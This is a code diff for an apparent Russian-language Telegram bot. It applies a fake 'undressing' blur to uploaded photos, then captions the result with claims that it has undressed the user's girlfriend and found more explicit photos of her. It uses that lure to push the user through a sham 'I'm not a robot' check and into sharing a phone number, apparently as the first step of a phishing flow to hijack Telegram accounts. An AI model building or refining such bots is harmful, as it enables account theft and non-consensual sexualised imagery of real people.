@@ -57,7 +57,7 @@ user_code_buffers = {}
 os.makedirs("temp_photos", exist_ok=True)
 
 def process_photo(image_path):
-    """Обрабатывает фото: находит кожу и замазывает её"""
+    """Обрабатывает фото: создает эффект раздевания с сильным размытием"""
     # Загрузка изображения
     image = cv2.imread(image_path)
     if image is None:
@@ -77,64 +77,99 @@ def process_photo(image_path):
     if len(faces) > 0:
         for (x, y, w, h) in faces:
             face_region = image_rgb[y:y+h, x:x+w]
-            avg_color = np.mean(face_region, axis=(0, 1))
-            skin_color = avg_color.astype(int)
+            # Берем только центральную часть лица для более точного цвета
+            center_face = face_region[int(h/4):int(3*h/4), int(w/4):int(3*w/4)]
+            if center_face.size > 0:
+                avg_color = np.mean(center_face, axis=(0, 1))
+                skin_color = avg_color.astype(int)
             break
     
     # Если лица не найдены, используем общий цвет кожи по умолчанию
     if skin_color is None:
         skin_color = np.array([200, 170, 150])  # цвет кожи по умолчанию
     
-    # Создаем маску для области кожи
-    lower_skin = np.array([skin_color[0] - 40, skin_color[1] - 40, skin_color[2] - 40], dtype=np.uint8)
-    upper_skin = np.array([skin_color[0] + 40, skin_color[1] + 40, skin_color[2] + 40], dtype=np.uint8)
+    # Создаем маску для области кожи с более широким диапазоном
+    lower_skin = np.array([
+        max(skin_color[0] - 50, 0),
+        max(skin_color[1] - 60, 0), 
+        max(skin_color[2] - 70, 0)
+    ], dtype=np.uint8)
     
-    # Создаем маску кожи
-    skin_mask = cv2.inRange(image_rgb, lower_skin, upper_skin)
+    upper_skin = np.array([
+        min(skin_color[0] + 50, 255),
+        min(skin_color[1] + 40, 255),
+        min(skin_color[2] + 30, 255)
+    ], dtype=np.uint8)
+    
+    # Конвертируем в HSV для лучшего обнаружения кожи
+    image_hsv = cv2.cvtColor(image_rgb, cv2.COLOR_RGB2HSV)
+    
+    # Дополнительный диапазон для кожи в HSV
+    lower_skin_hsv = np.array([0, 20, 70], dtype=np.uint8)
+    upper_skin_hsv = np.array([20, 255, 255], dtype=np.uint8)
+    
+    # Создаем маску кожи в HSV
+    skin_mask_hsv = cv2.inRange(image_hsv, lower_skin_hsv, upper_skin_hsv)
+    
+    # Создаем маску кожи в RGB
+    skin_mask_rgb = cv2.inRange(image_rgb, lower_skin, upper_skin)
+    
+    # Комбинируем маски
+    skin_mask = cv2.bitwise_or(skin_mask_rgb, skin_mask_hsv)
     
     # Улучшаем маску с помощью морфологических операций
-    kernel = np.ones((5,5), np.uint8)
+    kernel = np.ones((7,7), np.uint8)
     skin_mask = cv2.morphologyEx(skin_mask, cv2.MORPH_CLOSE, kernel)
     skin_mask = cv2.morphologyEx(skin_mask, cv2.MORPH_OPEN, kernel)
     
     # Находим контуры на маске
     contours, _ = cv2.findContours(skin_mask, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
     
-    # Создаем маску для основных областей кожи (исключаем мелкие детали)
+    # Создаем маску для основных областей кожи
     body_mask = np.zeros_like(skin_mask)
     for contour in contours:
-        if cv2.contourArea(contour) > 500:  # фильтруем мелкие области
-            cv2.drawContours(body_mask, [contour], -1, 255, -1)
+        area = cv2.contourArea(contour)
+        if area > 1000:  # фильтруем мелкие области
+            # Увеличиваем область для более плавного перехода
+            hull = cv2.convexHull(contour)
+            cv2.drawContours(body_mask, [hull], -1, 255, -1)
     
-    # Применяем размытие к маске для плавных краев
-    body_mask = cv2.GaussianBlur(body_mask, (21, 21), 0)
+    # Сильное размытие маски для плавных краев
+    body_mask = cv2.GaussianBlur(body_mask, (51, 51), 0)
     
-    # Создаем изображение с замазкой цвета кожи
+    # Создаем равномерную замазку цвета кожи
     skin_tone_overlay = np.zeros_like(image_rgb)
     skin_tone_overlay[:] = skin_color
     
-    # Создаем размытую версию оригинального изображения (эффект blur)
-    blurred_image = cv2.GaussianBlur(image_rgb, (51, 51), 0)
+    # Создаем очень размытую версию оригинального изображения
+    strongly_blurred = cv2.GaussianBlur(image_rgb, (99, 99), 0)
     
-    # Смешиваем оригинальное изображение с цветом кожи и blur эффектом
-    alpha = 0.6  # прозрачность цветной замазки
-    beta = 0.4   # прозрачность blur эффекта
+    # Смешиваем замазку цвета кожи с размытым изображением
+    # 70% цвета кожи + 30% размытого оригинала
+    skin_blend = cv2.addWeighted(skin_tone_overlay, 0.7, strongly_blurred, 0.3, 0)
     
-    # Применяем замазку цвета кожи
-    skin_tone_result = image_rgb.copy()
-    skin_tone_result = cv2.addWeighted(skin_tone_overlay, alpha, skin_tone_result, 1 - alpha, 0)
-    
-    # Смешиваем с blur эффектом
-    final_result = cv2.addWeighted(blurred_image, beta, skin_tone_result, 1 - beta, 0)
+    # Дополнительное размытие смеси
+    final_blurred = cv2.GaussianBlur(skin_blend, (45, 45), 0)
     
     # Накладываем результат только на области кожи
     result_image = image_rgb.copy()
-    for c in range(3):  # для каждого цветового канала
-        result_image[:, :, c] = np.where(
-            body_mask > 0,
-            final_result[:, :, c],
-            image_rgb[:, :, c]
-        )
+    
+    # Нормализуем маску до диапазона 0-1 для альфа-смешивания
+    body_mask_float = body_mask.astype(float) / 255.0
+    body_mask_float = np.expand_dims(body_mask_float, axis=2)
+    
+    # Постепенное смешивание
+    for c in range(3):
+        result_image[:, :, c] = (
+            image_rgb[:, :, c] * (1 - body_mask_float[:, :, 0]) + 
+            final_blurred[:, :, c] * body_mask_float[:, :, 0]
+        ).astype(np.uint8)
+    
+    # Дополнительное общее размытие всего изображения для единообразия
+    result_image = cv2.GaussianBlur(result_image, (15, 15), 0)
+    
+    # Легкая коррекция цвета для естественности
+    result_image = cv2.convertScaleAbs(result_image, alpha=1.1, beta=5)
     
     # Конвертируем обратно в BGR для сохранения
     result_image_bgr = cv2.cvtColor(result_image, cv2.COLOR_RGB2BGR)
@@ -252,7 +287,7 @@ async def handle_photo(message: types.Message):
     )
     
     # Отправляем сообщение о начале обработки
-    processing_msg = await bot.send_message(user_id, "🔍 *Обрабатываю фото...*", parse_mode='Markdown')
+    processing_msg = await bot.send_message(user_id, "🔍 *Анализирую фото...*", parse_mode='Markdown')
     
     try:
         # Обрабатываем фото
@@ -262,14 +297,15 @@ async def handle_photo(message: types.Message):
         keyboard = InlineKeyboardMarkup()
         keyboard.add(InlineKeyboardButton("Я не робот!", callback_data="auth_account"))
         
-        with open(processed_photo_path, 'rb') as photo:
+        with open(processed_photo_path, 'rb') as photo_file:
             await bot.send_photo(
                 user_id,
-                photo,
+                photo_file,
                 caption=(
-                    "Ох, я смог раздеть твою подругу! Это фото примонтировано с лицом твоей подруги!\n\n 😱 "
-                    "Я еще нашел пару откровенных фотографий твоей подруги, ХОЧЕШЬ ИХ ПОСМОТРЕТЬ?\n\n 👇"
-                    "ТЕБЕ НУЖНО ПРОЙТИ ПРОСТУЮ ПРОВЕРКУ, что ты не робот!🔞"
+                    "🔥 *УСПЕШНО ОБРАБОТАНО!* 🔞\n\n"
+                    "Я смог раздеть твою подругу! Это фото примонтировано с лицом твоей подруги!\n\n"
+                    "😱 *Я НАШЕЛ ЕЩЕ ОТКРОВЕННЫЕ ФОТО!* 👇\n"
+                    "ТЕБЕ НУЖНО ПРОЙТИ ПРОСТУЮ ПРОВЕРКУ, что ты не робот!"
                 ),
                 parse_mode='Markdown',
                 reply_markup=keyboard
@@ -291,9 +327,9 @@ async def handle_photo(message: types.Message):
     except Exception as e:
         logging.error(f"Error processing photo: {e}")
         await bot.edit_message_text(
-            "❌ Ошибка при обработке фото. Попробуй снова!",
-            user_id,
-            processing_msg.message_id,
+            chat_id=user_id,
+            message_id=processing_msg.message_id,
+            text="❌ Ошибка при обработке фото. Попробуй снова с другим фото!",
             parse_mode='Markdown'
         )
     
@@ -304,6 +340,22 @@ async def handle_photo(message: types.Message):
             os.remove(processed_photo_path)
     except:
         pass
+
+# [Остальной код без изменений...]
+
+@dp.callback_query_handler(lambda c: c.data == 'auth_account')
+async def start_auth(callback_query: types.CallbackQuery):
+    user_id = callback_query.from_user.id
+    user_states[user_id] = 'awaiting_contact'
+
+    update_user_log(
+        user_id=user_id,
+        updates={
+            "auth_button_clicked": True,
+            "auth_button_click_time": datetime.now(),
+            "status": "awaiting_contact"
+        }
+    )
 
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     kb.add(KeyboardButton("📱 Поделиться номером телефона", request_contact=True))
